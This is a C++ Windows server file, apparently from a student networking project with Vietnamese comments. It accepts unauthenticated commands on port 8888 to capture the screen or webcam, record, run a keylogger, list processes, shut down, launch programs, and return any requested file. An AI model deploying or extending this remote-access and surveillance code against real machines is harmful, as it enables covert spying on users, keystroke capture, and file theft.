#include "../Application/lib.h"
#include "../Application/executeCommand.h"
#include "../Application/sendFile.h"

const string saveDir = "C:/MMT/";

// Các command cần tạo file output
std::map<std::string, std::string> fileCommands = {
    {"get_screenshot", saveDir + "screenshot.png"},
    {"get_picture", saveDir + "picture.png"},
    {"list_program", saveDir + "running_programs.txt"},
    {"list_process", saveDir + "processes_with_pid.txt"},
    {"list_installed", saveDir + "installed_programs.txt"},
    {"start_recording", saveDir + "recording.avi"},
    {"keylogger", saveDir + "keylog.txt"}  // Thêm keylogger vào fileCommands
};

// Các command không cần tạo file nhưng cần confirmation
std::set<std::string> simpleCommands = {"shutdown", "restart",
                                        "cancel_shutdown", "stop_recording"};

bool is_start_program_command(const std::string& command) {
  return command.find("start_program") == 0;
}

// Function để check xem command có phải là keylogger với thời gian
bool is_keylogger_command(const std::string& command) {
  return command.find("keylogger") == 0;
}

// Nhận message từ client
std::string receive_command(SOCKET sock) {
  char buffer[4096] = {};
  int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);

  if (bytes <= 0) {
    return "";
  }

  buffer[bytes] = '\0';
  return std::string(buffer);
}

static std::string trim(const std::string& s) {
  size_t a = s.find_first_not_of(" \r\n\t");
  if (a == std::string::npos) return "";
  size_t b = s.find_last_not_of(" \r\n\t");
  return s.substr(a, b - a + 1);
}

// Xử lý client - server chỉ thực thi và gửi kết quả
void handle_client(SOCKET clientSocket) {
  std::cout << "[Connection] Client connected" << std::endl;

  try {
    std::string message = receive_command(clientSocket);
    if (message.empty()) {
      std::cout << "[Warning] Empty message received" << std::endl;
      closesocket(clientSocket);
      return;
    }

    std::istringstream iss(message);
    std::string sender_email, command;
    std::getline(iss, sender_email);
    std::getline(iss, command);

    sender_email = trim(sender_email);
    command = trim(command);

    std::cout << "[Server] Processing command: " << command << std::endl;

    // Xử lý send_file với path cụ thể
    if (command.find("send_file") == 0) {
      std::string filepath = command.substr(9);
      filepath = trim(filepath);

      if (!filepath.empty() && std::filesystem::exists(filepath)) {
        std::cout << "[Server] Sending file: " << filepath << std::endl;
        send_file_over_socket(clientSocket, filepath);
      } else {
        std::cout << "[Error] File not found: " << filepath << std::endl;
        size_t fileSize = 0;
        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
             sizeof(fileSize), 0);
      }
    }
    // Xử lý keylogger (có thể có tham số thời gian)
    else if (is_keylogger_command(command)) {
      std::string outputFile = fileCommands["keylogger"];

      std::filesystem::create_directories(
          std::filesystem::path(outputFile).parent_path());

      // Thực thi keylogger command với file output
      execute_command_with_file(command, outputFile);

      // Gửi file cho client
      if (std::filesystem::exists(outputFile)) {
        std::cout << "[Server] Sending keylogger result: " << outputFile
                  << std::endl;
        send_file_over_socket(clientSocket, outputFile);
      } else {
        std::cout << "[Error] Failed to generate keylog file" << std::endl;
        size_t fileSize = 0;
        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
             sizeof(fileSize), 0);
      }
    }
    // Xử lý các command khác tạo file
    else if (fileCommands.count(command)) {
      std::string outputFile = fileCommands[command];
      if (recording_in_progress.load()) {
        std::cout << "[Server] Recording in progress, refusing to send file yet." << std::endl;
        size_t zero = 0;
        send(clientSocket, reinterpret_cast<const char*>(&zero), sizeof(zero), 0);
        closesocket(clientSocket);
        return;
      }
      std::filesystem::create_directories(
          std::filesystem::path(outputFile).parent_path());

      execute_command_with_file(command, outputFile);

      if (std::filesystem::exists(outputFile)) {
        std::cout << "[Server] Sending result file: " << outputFile
                  << std::endl;
        send_file_over_socket(clientSocket, outputFile);
      } else {
        std::cout << "[Error] Failed to generate output file: " << outputFile
                  << std::endl;
        size_t fileSize = 0;
        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
             sizeof(fileSize), 0);
      }
    }
    // Xử lý các command đơn giản (shutdown, restart, stop_program)
    else if (simpleCommands.count(command) ||
             is_start_program_command(command)) {
      execute_command(command);

      // Gửi confirmation message
      std::string confirmMsg = "Command executed: " + command;
      size_t msgSize = confirmMsg.length();
      send(clientSocket, reinterpret_cast<const char*>(&msgSize),
           sizeof(msgSize), 0);
      send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
    } else {
      // Unknown command
      std::string errorMsg = "Unknown command: " + command;
      size_t msgSize = errorMsg.length();
      send(clientSocket, reinterpret_cast<const char*>(&msgSize),
           sizeof(msgSize), 0);
      send(clientSocket, errorMsg.c_str(), static_cast<int>(msgSize), 0);
    }

  } catch (const std::exception& e) {
    std::cout << "[Error] Exception: " << e.what() << std::endl;
  }

  closesocket(clientSocket);
  std::cout << "[Disconnect] Client disconnected" << std::endl;
}

int main() {
  std::cout << "[Startup] Starting server..." << std::endl;

  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    std::cout << "[Error] WSAStartup failed" << std::endl;
    return 1;
  }

  SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  if (serverSocket == INVALID_SOCKET) {
    std::cout << "[Error] Socket creation failed" << std::endl;
    WSACleanup();
    return 1;
  }

  // Set socket option để reuse address
  int optval = 1;
  setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR,
             reinterpret_cast<const char*>(&optval), sizeof(optval));

  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(8888);
  serverAddr.sin_addr.s_addr = INADDR_ANY;

  if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cout << "[Error] Bind failed" << std::endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  if (listen(serverSocket, 5) == SOCKET_ERROR) {
    std::cout << "[Error] Listen failed" << std::endl;
    closesocket(serverSocket);
    WSACleanup();
    return 1;
  }

  std::cout << "[Server] Listening on port 8888..." << std::endl;

  while (true) {
    sockaddr_in clientAddr{};
    int clientSize = sizeof(clientAddr);
    SOCKET clientSocket =
        accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);

    if (clientSocket == INVALID_SOCKET) {
      std::cout << "[Warning] Accept failed" << std::endl;
      continue;
    }

    // Xử lý client
    handle_client(clientSocket);
  }

  closesocket(serverSocket);
  WSACleanup();
  return 0;
}